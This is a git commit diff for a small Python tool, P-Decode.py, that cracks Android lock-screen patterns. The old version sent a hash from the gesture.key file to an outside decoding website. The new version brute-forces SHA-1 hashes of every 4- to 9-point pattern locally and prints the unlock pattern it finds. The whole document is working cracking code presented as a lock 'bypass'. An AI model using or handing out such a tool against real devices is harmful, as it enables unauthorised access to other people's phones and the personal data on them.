dcab6af6bda451348c2d31b685e5d0a252397fef
MGF15 <mohamed5548@live.com>
2017-07-19 12:52:18 +0300

    Update P-Decode.py
    rewrite

--- P-Decode.py
+++ P-Decode.py
@@ -1,61 +1,55 @@
-import urllib,urllib2,re
+import itertools,sys,time
 from hashlib import sha1
-from sys import argv
 
-#P-Decode 
-#Android Pattern ByPass ()
-#Coded by MGF15
-#first you need gesture.key file you can find it on /data/system/
-
-def get(x):
-	try:
-		site = "http://android.saz.lt/cgi-bin/pattern.py"
-
-		P = urllib.urlencode({'encoded':x})
-
-		req  = urllib2.Request(site)
-
-		b = urllib2.urlopen(req, P)
-
-		data = b.read()
-
-		g = re.findall(r'<strong>(.*?)</strong>',data)
-
-		print "\nDecoded Pattern :" , g[0]
-	except:
-		print 'Check Your Internet'
-if len(argv) < 2:
-	print 'Options::\n'
-	print '\t-f [File].key'
-	print '\t-p [Pattern Hash]'
-	print '\tEx: \n\n\t-f gesture.key '
-	print '\t-p 093736a37d9b401e5138cbcb077b4f4ecd40fe0a'
-	exit()
-opt = argv[1]
-
-if opt == '-f':
-
-	File = argv[2]
-
-	one = open(File,'rb')
-
-	u = one.read(sha1().digest_size).encode('hex')
-
-	print '\nPattern Hash :: ' + u.upper() + ' ::'
-	get(u)
-
-if opt == '-p':
-	u = argv[2]
-	get(u)
-	
-n = '''
-+---+---+---+
-| 0 | 1 | 2 |
-+---+---+---+
-| 3 | 4 | 5 |
-+---+---+---+
-| 6 | 7 | 8 |
-+---+---+---+
 '''
 
-print "\n",n
+android pattern cracker 
+
+Coded by MGF15
+
+file in android ->  /data/system/gesture.key
+'''
+
+pattern = "012345678"
+
+p_ = '''
+ +---+---+---+
+ | 0 | 1 | 2 |
+ +---+---+---+
+ | 3 | 4 | 5 |
+ +---+---+---+
+ | 6 | 7 | 8 |
+ +---+---+---+
+'''
+now=time.time()
+
+def crack(hash):
+	
+	for i in range(4,10):
+
+		for p in itertools.permutations(pattern, i):
+			# pattern -> 1234 -> 01020304 -> \x01\x02\x03\x04 then sha1 hash
+			x = ''.join(['0' + i for i in p]).decode('hex')
+
+			sha1_hash = sha1(x).hexdigest()
+
+			if hash == sha1_hash:
+
+				print '[+] pattern -> ' , ''.join(p) 
+				print p_
+				print '[*] Time : ', round(time.time() - now, 2)
+if __name__ == "__main__":
+
+	if len(sys.argv) < 3:
+		print 'p-decode.py [-p hash ] or [-f gesture.key]'
+
+	elif sys.argv[1] == '-f':
+		file = open(sys.argv[2],'rb').read()
+		hash = file.encode('hex')
+		crack(hash)
+
+	elif sys.argv[1] == '-p':
+		hash = sys.argv[2]		
+		crack(hash)
+	else:
+		exit()
